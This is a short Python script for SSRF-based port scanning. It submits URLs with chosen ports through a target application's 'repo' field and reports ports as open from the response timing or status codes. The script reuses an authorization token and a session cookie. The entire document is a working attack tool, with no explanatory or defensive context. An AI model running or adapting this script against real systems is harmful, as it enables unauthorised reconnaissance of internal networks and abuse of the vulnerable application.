import requests

ports = [21,22,53,325,19259,8080]    # Add List Of Ports To Scan

target_url = 'https://target-url'
scan_url = 'https://your-domain.com'  # Your Internal Or External URL To Scan
auth = ''       # Your Authorization Token
cookie = ''     # Your Session Cookie

def portscan():
    for port in ports:
        post_data={'repo': f'{scan_url}:{port}/'}  # JSON Data Body Of Request
        newHeaders = {'Content-type': 'application/json;charset=utf-8', 'Accept': 'application/json;charset=utf-8','Authorization': f'{auth}'}  # Add Required Headers
        my_cookies = {'Cookie': f'{cookie}'}
        response = requests.post(target_url,headers=newHeaders,cookies=my_cookies, json=post_data)

        if response.elapsed.total_seconds() < 10:   # Time Taken By Open Ports To Respond
            print(f"Open Port : {scan_url}:{port}")
        elif response.status_code in [200,301]:     # Application Respond With Status Code On Open Ports
            print(f"Open Port : {scan_url}:{port}")
        else:
            print(f"Closed Port : {port}")

portscan()